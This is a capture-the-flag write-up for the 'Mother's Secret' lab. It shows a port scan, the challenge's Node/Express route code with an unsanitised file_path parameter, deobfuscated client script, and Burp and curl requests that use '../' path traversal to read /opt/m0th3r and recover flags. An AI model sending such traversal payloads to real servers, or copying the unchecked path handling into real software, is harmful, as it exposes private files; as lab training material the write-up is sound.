# Box Name

## Mother's_Secret

## Overview
---
* [[#Enumeration]]
	* Rustscan

* [[#Initial Foothold]]
	* web enumeration and code review

* [[#Privilege Escalation]]
	* None

---
## Enumeration
---
## Nmap
```
Nmap scan report for 10.10.234.65
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5f:b2:7b:b6:c1:1d:35:cd:4e:66:03:dd:63:31:9f:77 (RSA)
|   256 51:d1:9c:b2:f3:a6:0c:aa:a4:01:c7:3d:72:28:94:04 (ECDSA)
|_  256 5c:7b:1d:a3:75:66:c6:f5:d0:09:82:06:d1:1e:f2:54 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Mothers Secret
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

##Downloaded Task File
### routes(2).txt
```js
API ROUTES

------------------------------------------

yaml.js
------------------------------------------

import express from "express";
import yaml from "js-yaml";
import fs from "fs";
import { attachWebSocket } from "../websocket.js";

const Router = express.Router();

const isYaml = (filename) => filename.split(".").pop() === "yaml";

Router.post("/", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;

  if (!isYaml(filePath)) {
    res.status(500).json({
      status: "error",
      message: "Not a YAML file path.",
    });
    return;
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Failed to read the file.",
      });
      return;
    }

    res.status(200).send(yaml.load(data));

    attachWebSocket().of("/yaml").emit("yaml", "YAML data has been processed.");
  });
});

export default Router;
------------------------------------------

Nostromo.js
------------------------------------------

import express from "express";
import fs from "fs";
// import { attachWebSocket } from "../../mothers_secret_challenge/websocket.js";
import { attachWebSocket } from "../websocket.js";
import { isYamlAuthenticate } from "./yaml.js";
let isNostromoAuthenticate = false;

const Router = express.Router();

Router.post("/nostromo", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Science Officer Eyes Only",
      });
      return;
    }

    isNostromoAuthenticate = true
    res.status(200).send(data);

    attachWebSocket()
      .of("/nostromo")
      .emit("nostromo", "Nostromo data has been processed.");
  });
});

Router.post("/nostromo/mother", (req, res) => {
 
  let file_path = req.body.file_path;
  const filePath = `./mother/${file_path}`;

  if(!isNostromoAuthenticate || !isYamlAuthenticate){
    res.status(500).json({
      status: "Authentication failed",
      message: "Kindly visit nostromo & yaml route first.",
    });
    return 
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Science Officer Eyes Only",
      });
      return;
    }

    res.status(200).send(data);

    // attachWebSocket()
    //   .of("/nostromo")
    //   .emit("nostromo", "Nostromo data has been processed.");
  });
});

export default Router;

```

### View Web Source 
#### found index.min.js 
```js
const _0x267948=_0x42b1;(function(_0x393fcf,_0x4cd75b){const _0xb3790a=_0x42b1,_0x9d637f=_0x393fcf();while(!![]){try{const _0x407b49=-parseInt(_0xb3790a(0x10a))/0x1+parseInt(_0xb3790a(0x105))/0x2*(parseInt(_0xb3790a(0x112))/0x3)+parseInt(_0xb3790a(0x106))/0x4+-parseInt(_0xb3790a(0x107))/0x5+parseInt(_0xb3790a(0xdf))/0x6*(parseInt(_0xb3790a(0xea))/0x7)+-parseInt(_0xb3790a(0xe9))/0x8+-parseInt(_0xb3790a(0x109))/0x9;if(_0x407b49===_0x4cd75b)break;else _0x9d637f['push'](_0x9d637f['shift']());}catch(_0x2c5519){_0x9d637f['push'](_0x9d637f['shift']());}}}(_0x5f26,0xd18ff));const socket=io(_0x267948(0xf4));function _0x42b1(_0x5c1e5b,_0x36d94d){const _0x5f26ef=_0x5f26();return _0x42b1=function(_0x42b1b0,_0x228538){_0x42b1b0=_0x42b1b0-0xdf;let _0x5211b3=_0x5f26ef[_0x42b1b0];return _0x5211b3;},_0x42b1(_0x5c1e5b,_0x36d94d);}let authYaml=![],authNostromo=![];const yamlSocket=io('/yaml'),nostromoSocket=io(_0x267948(0xe1)),authWebSocket=()=>{const _0x156a2c=_0x267948;yamlSocket['on'](_0x156a2c(0xe4),()=>{const _0x4307e0=_0x156a2c;console[_0x4307e0(0xf6)](_0x4307e0(0x10b));}),yamlSocket['on'](_0x156a2c(0x10d),_0x4cb35d=>{authYaml=!![];if(authNostromo&&authYaml)modifyData();}),yamlSocket['on']('disconnect',()=>{const _0x39da50=_0x156a2c;console['log'](_0x39da50(0x111));}),nostromoSocket['on'](_0x156a2c(0xe4),()=>{const _0x502a33=_0x156a2c;console[_0x502a33(0xf6)](_0x502a33(0x100));}),nostromoSocket['on'](_0x156a2c(0xf7),_0x48d569=>{authNostromo=!![];if(authNostromo&&authYaml)modifyData();}),nostromoSocket['on'](_0x156a2c(0x110),()=>{const _0x29c790=_0x156a2c;console[_0x29c790(0xf6)](_0x29c790(0xe2));});};authWebSocket();const modifyData=()=>{const _0x3f3ee3=_0x267948;contentx[0x2]=_0x3f3ee3(0xf0),contentx[0x3]=atob(_0x3f3ee3(0xec)),document['querySelector'](_0x3f3ee3(0xf1))[_0x3f3ee3(0x101)]=_0x3f3ee3(0xf0);};let totalCustomDotsContainer=0x20,totalCustomDots=0x2a;function siteTemp(){const _0x53a321=_0x267948;return _0x53a321(0xfb);}((()=>{const _0x420c72=_0x267948,_0x36458a=document[_0x420c72(0xf2)](_0x420c72(0x102)),_0x4918de=[];for(let _0x36719e=0x0;_0x36719e<totalCustomDotsContainer;_0x36719e++){let _0x415735='';for(let _0x2af50d=0x0;_0x2af50d<totalCustomDots;_0x2af50d++){_0x415735+=_0x420c72(0xf3);}if(_0x36719e===0x5)_0x4918de['push'](siteTemp());_0x4918de[_0x420c72(0x108)](_0x420c72(0xfd)+_0x415735+_0x420c72(0x113));}_0x36458a['insertAdjacentHTML'](_0x420c72(0x10f),_0x4918de[_0x420c72(0xe8)](''));})());const allBoxes=document[_0x267948(0xff)](_0x267948(0xf5)),arrow=_0x267948(0xef),removeArrow=()=>{const _0x43b4b2=_0x267948;allBoxes[_0x43b4b2(0x10e)](_0x5061c2=>{const _0x1d74ff=_0x43b4b2;_0x5061c2[_0x1d74ff(0x101)]='';});},boxes=[_0x267948(0xe5),_0x267948(0xe0),_0x267948(0x104),_0x267948(0xfe)];let contentx=[_0x267948(0xe3),_0x267948(0xee),_0x267948(0xf8),atob(_0x267948(0xfa))];function _0x5f26(){const _0x491022=['Embedded\x20within\x20the\x20intricate\x20codes\x20of\x20Mother\x27s\x20system\x20lies\x20the\x20Alien\x20Loader,\x20a\x20peculiar\x20YAML\x20loader\x20function.\x20This\x20function\x20parses\x20and\x20loads\x20YAML\x20data.\x20Be\x20cautious,\x20as\x20this\x20loader\x20holds\x20the\x20truths\x20to\x20unveil\x20the\x20hidden\x20paths.','connect','Alien\x20Loader','addEventListener','<p>','join','12783888REfoSA','452151GTewca','</p>','VEhNX0ZMQUd7MFJEM1JfOTM3fQ==','keyCode','[!]CAUTION[!]\x20The\x20Nostromo\x20holds\x20countless\x20winding\x20corridors\x20and\x20concealed\x20chambers,\x20harboring\x20secrets\x20that\x20lie\x20beyond\x20the\x20intended\x20boundaries.\x20Embrace\x20the\x20power\x20of\x20relative\x20file\x20paths\x20within\x20MOTHER,\x20to\x20uncover\x20SECRETS\x20and\x20traverse\x20the\x20labyrinthine\x20structure\x20of\x20the\x20ship\x20and\x20reach\x20your\x20desired\x20destinations.','\x0a<div\x20class=\x22absolute\x20top-[50%]\x20-right-[51px]\x20w-[51px]\x20flex\x20items-center\x20justify-center\x22>\x0a<p\x20class=\x22theme-line\x20w-[51px]\x22></p>\x0a</div>\x0a','Ash','.crew-member','querySelector','<p\x20class=\x22custom-dots__dots\x22></p>','/yaml','.button-box','log','nostromo','Crew\x20Member','.content-placeholder','Q0xBU1NJRklFRA==','\x0a\x20<div\x20class=\x22special-grid\x22>\x0a\x20\x20<div\x0a\x20\x20class=\x22w-full]\x20rounded-lg\x20flex\x20items-center\x20z-20\x20p-3\x20pb-0\x20\x20shadow-lg\x20flex-1\x22\x0a\x20\x20>\x0a\x20\x20<div\x20class=\x22flex\x20flex-col\x20w-[30%]\x20justify-between\x20h-full\x20mr-[50px]\x20text-center\x22>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22top\x22\x0a\x20\x20\x20\x20>\x20\x0a\x20\x20\x20\x20<div\x20class=\x22absolute\x20top-[50%]\x20-right-[51px]\x20w-[51px]\x20flex\x20items-center\x20justify-center\x22>\x0a\x20\x20\x20\x20\x20\x20<p\x20class=\x22theme-line\x20w-[51px]\x22></p>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20Alien\x20Loader\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22bottom\x22\x0a\x20\x20\x20\x20>\x20Pathways\x20</div>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22left\x22\x0a\x20\x20\x20\x20>\x20Role\x20</div>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22p-4\x20theme-green\x20rounded-lg\x20relative\x20button-box\x22\x0a\x20\x20\x20\x20\x20\x20id=\x22right\x22\x0a\x20\x20\x20\x20>\x20Flag\x20</div>\x0a\x20\x20</div>\x0a\x20\x20<div\x20class=\x22flex\x20justify-center\x20flex-1\x20h-[20rem]\x20overflow-y-auto\x20descr-box\x20\x09\x20overflow-x-hidden\x20theme-green\x22>\x0a\x20\x20\x20\x20<div\x0a\x20\x20\x20\x20\x20\x20class=\x22\x20rounded-lg\x20py-2\x20px-4\x20\x20flex\x20gap-4\x20items-center\x20justify-center\x20mr-1\x22\x0a\x20\x20\x20\x20>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22content-placeholder\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Embedded\x20within\x20the\x20intricate\x20codes\x20of\x20Mother\x27s\x20system\x20lies\x20the\x20Alien\x20Loader,\x20a\x20peculiar\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20YAML\x20loader\x20function.\x20This\x20function\x20parses\x20and\x20loads\x20YAML\x20data.\x20Be\x20cautious,\x20as\x20this\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20loader\x20holds\x20the\x20truths\x20to\x20unveil\x20the\x20hidden\x20paths.\x0a\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20</div>\x0a\x20\x20</div>\x0a\x20\x20<div\x20class=\x22flex\x20w-full\x20mx-auto\x20items-center\x20z-20\x20gap-2\x20pl-2\x20shadow-lg\x20theme-color\x22\x20>\x0a\x20\x20\x20\x20<p\x20class=\x22text-lg\x22>Use</p>\x0a\x20\x20\x20\x20<b\x20class=\x22text-xl\x22>UP</b>\x0a\x20\x20\x20\x20<p\x20class=\x22text-lg\x22>and</p>\x0a\x20\x20\x20\x20<b\x20class=\x22text-xl\x22>DOWN</b>\x0a\x20\x20\x20\x20<p\x20class=\x22text-lg\x22>keys\x20to\x20move.</p>\x0a\x20\x20</div>\x0a</div>\x0a\x20\x20','keydown','<div\x20class=\x22custom-dots\x22>','Flag','querySelectorAll','Connected\x20to\x20/nostromo\x20route','innerHTML','.dots-container','which','Role','2YXlRBI','6035552fsqHMF','769345BuEAYr','push','4122108yFVOqX','327550PsrtFg','Connected\x20to\x20/yaml\x20route','insertAdjacentHTML','yaml','forEach','afterbegin','disconnect','Disconnected\x20from\x20/yaml\x20route','1591329qUpoub','</div>','126GvQOEt','Pathways','/nostromo','Disconnected\x20from\x20/nostromo\x20route'];_0x5f26=function(){return _0x491022;};return _0x5f26();}const addArrow=_0x1005d3=>{const _0x1094b2=_0x267948;let _0x205dbb=contentx;const _0x48ef0b=document[_0x1094b2(0xf2)](_0x1094b2(0xf9));allBoxes[_0x1094b2(0x10e)]((_0x5b4433,_0x40d7ad)=>{const _0x1e5f91=_0x1094b2;_0x5b4433['innerHTML']=boxes[_0x40d7ad],_0x1005d3==_0x40d7ad&&(_0x5b4433[_0x1e5f91(0x10c)](_0x1e5f91(0x10f),arrow),_0x48ef0b[_0x1e5f91(0x101)]='',_0x48ef0b[_0x1e5f91(0x10c)](_0x1e5f91(0x10f),_0x1e5f91(0xe7)+_0x205dbb[value]+_0x1e5f91(0xeb)));});};let value=0x0;document[_0x267948(0xe6)](_0x267948(0xfc),function(_0x24853f){const _0x31f3e6=_0x267948;var _0x4fa5b9=_0x24853f[_0x31f3e6(0xed)]||_0x24853f[_0x31f3e6(0x103)];switch(_0x4fa5b9){case 0x26:value=value-0x1;if(value<0x0)value=0x0;removeArrow(),addArrow(value);break;case 0x28:value=value+0x1;if(value>0x3)value=0x3;removeArrow(),addArrow(value);break;default:return;}});
```

#### deobfuscated index.min.js
```js
let authYaml = false;
let authNostromo = false;
const yamlSocket = io('/yaml');
const nostromoSocket = io("/nostromo");
const authWebSocket = () => {
    yamlSocket.on("connect", () => {
        console.log("Connected to /yaml route");
    });
    yamlSocket.on("yaml", _0x4cb35d => {
        authYaml = true;
        if (authNostromo && authYaml) {
            modifyData();
        }
    });
    yamlSocket.on('disconnect', () => {
        console.log("Disconnected from /yaml route");
    });
    nostromoSocket.on("connect", () => {
        console.log("Connected to /nostromo route");
    });
    nostromoSocket.on("nostromo", _0x48d569 => {
        authNostromo = true;
        if (authNostromo && authYaml) {
            modifyData();
        }
    });
    nostromoSocket.on("disconnect", () => {
        console.log("Disconnected from /nostromo route");
    });
};
authWebSocket();
const modifyData = () => {
    contentx[0x2] = "Ash";
    contentx[0x3] = atob("VEhNX0ZMQUd7MFJEM1JfOTM3fQ==");
    document.querySelector(".crew-member").innerHTML = "Ash";
};
function siteTemp() {
    return "\n <div class=\"special-grid\">\n  <div\n  class=\"w-full] rounded-lg flex items-center z-20 p-3 pb-0  shadow-lg flex-1\"\n  >\n  <div class=\"flex flex-col w-[30%] justify-between h-full mr-[50px] text-center\">\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"top\"\n    > \n    <div class=\"absolute top-[50%] -right-[51px] w-[51px] flex items-center justify-center\">\n      <p class=\"theme-line w-[51px]\"></p>\n    </div>\n    Alien Loader\n    </div>\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"bottom\"\n    > Pathways </div>\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"left\"\n    > Role </div>\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"right\"\n    > Flag </div>\n  </div>\n  <div class=\"flex justify-center flex-1 h-[20rem] overflow-y-auto descr-box \t overflow-x-hidden theme-green\">\n    <div\n      class=\" rounded-lg py-2 px-4  flex gap-4 items-center justify-center mr-1\"\n    >\n      <div class=\"content-placeholder\">\n        <p>\n          Embedded within the intricate codes of Mother's system lies the Alien Loader, a peculiar\n          YAML loader function. This function parses and loads YAML data. Be cautious, as this\n          loader holds the truths to unveil the hidden paths.\n        </p>\n      </div>\n    </div>\n  </div>\n  </div>\n  <div class=\"flex w-full mx-auto items-center z-20 gap-2 pl-2 shadow-lg theme-color\" >\n    <p class=\"text-lg\">Use</p>\n    <b class=\"text-xl\">UP</b>\n    <p class=\"text-lg\">and</p>\n    <b class=\"text-xl\">DOWN</b>\n    <p class=\"text-lg\">keys to move.</p>\n  </div>\n</div>\n  ";
}
(() => {
    const _0x36458a = document.querySelector(".dots-container");
    const _0x4918de = [];
    for (let _0x36719e = 0x0; _0x36719e < 0x20; _0x36719e++) {
        let _0x415735 = '';
        for (let _0x2af50d = 0x0; _0x2af50d < 0x2a; _0x2af50d++) {
            _0x415735 += "<p class=\"custom-dots__dots\"></p>";
        }
        if (_0x36719e === 0x5) {
            _0x4918de.push("\n <div class=\"special-grid\">\n  <div\n  class=\"w-full] rounded-lg flex items-center z-20 p-3 pb-0  shadow-lg flex-1\"\n  >\n  <div class=\"flex flex-col w-[30%] justify-between h-full mr-[50px] text-center\">\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"top\"\n    > \n    <div class=\"absolute top-[50%] -right-[51px] w-[51px] flex items-center justify-center\">\n      <p class=\"theme-line w-[51px]\"></p>\n    </div>\n    Alien Loader\n    </div>\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"bottom\"\n    > Pathways </div>\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"left\"\n    > Role </div>\n    <div\n      class=\"p-4 theme-green rounded-lg relative button-box\"\n      id=\"right\"\n    > Flag </div>\n  </div>\n  <div class=\"flex justify-center flex-1 h-[20rem] overflow-y-auto descr-box \t overflow-x-hidden theme-green\">\n    <div\n      class=\" rounded-lg py-2 px-4  flex gap-4 items-center justify-center mr-1\"\n    >\n      <div class=\"content-placeholder\">\n        <p>\n          Embedded within the intricate codes of Mother's system lies the Alien Loader, a peculiar\n          YAML loader function. This function parses and loads YAML data. Be cautious, as this\n          loader holds the truths to unveil the hidden paths.\n        </p>\n      </div>\n    </div>\n  </div>\n  </div>\n  <div class=\"flex w-full mx-auto items-center z-20 gap-2 pl-2 shadow-lg theme-color\" >\n    <p class=\"text-lg\">Use</p>\n    <b class=\"text-xl\">UP</b>\n    <p class=\"text-lg\">and</p>\n    <b class=\"text-xl\">DOWN</b>\n    <p class=\"text-lg\">keys to move.</p>\n  </div>\n</div>\n  ");
        }
        _0x4918de.push("<div class=\"custom-dots\">" + _0x415735 + "</div>");
    }
    _0x36458a.insertAdjacentHTML("afterbegin", _0x4918de.join(''));
})();
const allBoxes = document.querySelectorAll(".button-box");
const arrow = "\n<div class=\"absolute top-[50%] -right-[51px] w-[51px] flex items-center justify-center\">\n<p class=\"theme-line w-[51px]\"></p>\n</div>\n";
const removeArrow = () => {
    allBoxes.forEach(_0x5061c2 => {
        _0x5061c2.innerHTML = '';
    });
};
const boxes = ["Alien Loader", "Pathways", "Role", "Flag"];
let contentx = ["Embedded within the intricate codes of Mother's system lies the Alien Loader, a peculiar YAML loader function. This function parses and loads YAML data. Be cautious, as this loader holds the truths to unveil the hidden paths.", "[!]CAUTION[!] The Nostromo holds countless winding corridors and concealed chambers, harboring secrets that lie beyond the intended boundaries. Embrace the power of relative file paths within MOTHER, to uncover SECRETS and traverse the labyrinthine structure of the ship and reach your desired destinations.", "Crew Member", atob("Q0xBU1NJRklFRA==")];
const addArrow = _0x1005d3 => {
    const _0x48ef0b = document.querySelector(".content-placeholder");
    allBoxes.forEach((_0x5b4433, _0x40d7ad) => {
        _0x5b4433.innerHTML = boxes[_0x40d7ad];
        if (_0x1005d3 == _0x40d7ad) {
            _0x5b4433.insertAdjacentHTML("afterbegin", "\n<div class=\"absolute top-[50%] -right-[51px] w-[51px] flex items-center justify-center\">\n<p class=\"theme-line w-[51px]\"></p>\n</div>\n");
            _0x48ef0b.innerHTML = '';
            _0x48ef0b.insertAdjacentHTML("afterbegin", "<p>" + contentx[value] + "</p>");
        }
    });
};
let value = 0x0;
document.addEventListener("keydown", function (_0x24853f) {
    var _0x4fa5b9 = _0x24853f.keyCode || _0x24853f.which;
    switch (_0x4fa5b9) {
        case 0x26:
            value = value - 0x1;
            if (value < 0x0) {
                value = 0x0;
            }
            removeArrow();
            addArrow(value);
            break;
        case 0x28:
            value = value + 0x1;
            if (value > 0x3) {
                value = 0x3;
            }
            removeArrow();
            addArrow(value);
            break;
        default:
            return;
    }
});
```
---
## Initial Foothold
---
from the room task description
```
Operating Manual

﻿Below are some sequences and operations to get you started. Use the following to unlock information and navigate Mother:  

- Emergency command override is 100375. Use it when accessing _Alien Loaders_. 
- Download the task files to learn about Mother's routes.
- Hitting the _routes_ in the _right_ order makes Mother confused, it might think you are a Science Officer!
```
### Using BurpSuite

#### from the routes(2).txt file 
- we need to make a POST req. to the /yaml endpoint with a file that ends whit.yaml
	- from the task description used the emergency override 100375 as the .yaml file
3
```request
POST /yaml/ HTTP/1.1
Host: 10.10.36.168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 0

{
	"file_path":"100375.yaml"
}
```

```response
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 145
ETag: W/"91-vlXLvrSE+lq2b39gV3DLzWtdxSI"
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 17:12:36 GMT
Connection: close

FOR SCIENCE OFFICER EYES ONLY  special SECRETS:  REROUTING TO: api/nostromo ORDER: 0rd3r937.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
```

 - next I sent a POST request to api/nostromo  with 0rd3r937.txt in the body
```request
POST /api/nostomo HTTP/1.1
Host: 10.10.36.168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 34

{
	"file_path":"0rd3r937.txt"
}
```

```response
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 235
ETag: W/"eb-EJNI0qIDrmacP1Xukw4cCkjOsRU"
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 17:18:02 GMT
Connection: close

                    Mother
FOR SCIENCE OFFICER EYES ONLY 
SPECIAL ORDER 937 [............

PRIORITIY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]

ALL OTHER CONSIDERATIONS SECONDARY

CREW EXPENDABLE

Flag{X3n0M0Rph}

```

- now back to the routs(2).txt file looking at the nostromo.js route it has a rout for /nostromo/mother so I sent a POST request to that as well
	- I used secret.txt in the body for the file_path
```request
POST /api/nostromo/mother HTTP/1.1
Host: 10.10.36.168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 31

{
	"file_path":"secret.txt"
}
```

```response
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 20
ETag: W/"14-tvEfAfXkfZj0fkO0sbSUh5kbLbs"
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 17:23:02 GMT
Connection: close

Secret: /opt/m0th3r

```

- Cool looks like we found where mothers secret is located
- now lets do some relative path traversal to see if we can find mothers secret

```request
POST /api/nostromo/mother HTTP/1.1
Host: 10.10.36.168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 49

{
	"file_path":"../../../../../../opt/m0th3r"
}
```

```response
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 76
ETag: W/"4c-0512yZ2S4pvh3pl/l4Q2TyD6tpU"
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 17:27:22 GMT
Connection: close

Classified information.

Secret: Flag{Ensure_return_of_organism_meow_meow!}

```
---
### Using cURL cmd
----
```bash
┌──(kn1ght㉿Kali)-[~/THM/MothersSecret]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"file_path": "100375.yaml"}' http://10.10.36.168/yaml    
FOR SCIENCE OFFICER EYES ONLY  special SECRETS:  REROUTING TO: api/nostromo ORDER: 0rd3r937.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
```

```bash
┌──(kn1ght㉿Kali)-[~/THM/MothersSecret]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"file_path": "0rd3r937.txt"}' http://10.10.36.168/api/nostromo 
                    Mother
FOR SCIENCE OFFICER EYES ONLY 
SPECIAL ORDER 937 [............

PRIORITIY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]

ALL OTHER CONSIDERATIONS SECONDARY

CREW EXPENDABLE

Flag{X3n0M0Rph}

```

```bash
                                                                                                                    
┌──(kn1ght㉿Kali)-[~/THM/MothersSecret]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"file_path": "../../../../opt/m0th3r"}' http://10.10.36.168:80/api/nostromo/mother
Classified information.

Secret: Flag{Ensure_return_of_organism_meow_meow!}
            
```